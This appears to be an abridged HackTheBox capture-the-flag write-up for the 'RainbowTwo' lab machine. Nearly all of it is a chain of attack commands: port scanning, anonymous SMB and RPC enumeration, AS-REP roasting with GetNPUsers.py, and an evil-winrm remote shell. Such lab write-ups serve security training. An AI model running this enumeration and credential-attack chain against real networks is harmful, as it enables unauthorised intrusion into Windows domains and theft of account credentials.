---
layout: page
title: "RainbowTwo - HackTheBox Writeup"
...
```bash
nmap -sC -sV -p- -T4 -oN nmap.txt 10.10.x.x
```
...
```bash
crackmapexec smb 10.10.x.x -u '' -p '' --shares
```
We also inspect Active Directory domain configuration via RPCClient:
```bash
rpcclient -U "" -N 10.10.x.x -c "enumdomusers"
```
...
```bash
GetNPUsers.py -dc-ip 10.10.x.x -no-pass -usersfile users.txt domains/
```
...
```bash
evil-winrm -i 10.10.x.x -u username -p password
```
